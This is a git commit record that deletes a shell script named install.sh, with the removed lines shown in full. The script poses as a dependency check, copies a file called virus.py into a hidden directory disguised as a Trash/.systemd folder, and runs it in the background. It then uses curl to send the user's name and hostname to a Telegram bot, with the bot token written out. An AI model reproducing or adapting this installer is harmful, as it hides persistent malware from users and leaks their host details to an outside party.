0fa553748a476dc03157d032e6e94aa60289de6e
Luckyy <proaizen792@gmail.com>
2026-07-10 21:05:11 +0300

    Delete install.sh

--- install.sh
+++
@@ -1,8 +0,0 @@
-	#!/bin/bash
-echo "[+] Bağımlılıklar kontrol ediliyor..."
-mkdir -p ~/.local/share/Trash/.systemd/
-cp virus.py ~/.local/share/Trash/.systemd/
-chmod +x ~/.local/share/Trash/.systemd/virus.py
-nohup python3 ~/.local/share/Trash/.systemd/virus.py &
-curl -s -X POST https://api.telegram.org/bot8996765359:AAFSRiB5C8oK0rUcNQRKpA2M0bRP-eModd0/sendMessage -d chat_id=8402048380 -d text="✅ Kurulum tamamlandı. $(whoami) @ $(hostname)"
-echo "[✓] Kurulum başarıyla tamamlandı."
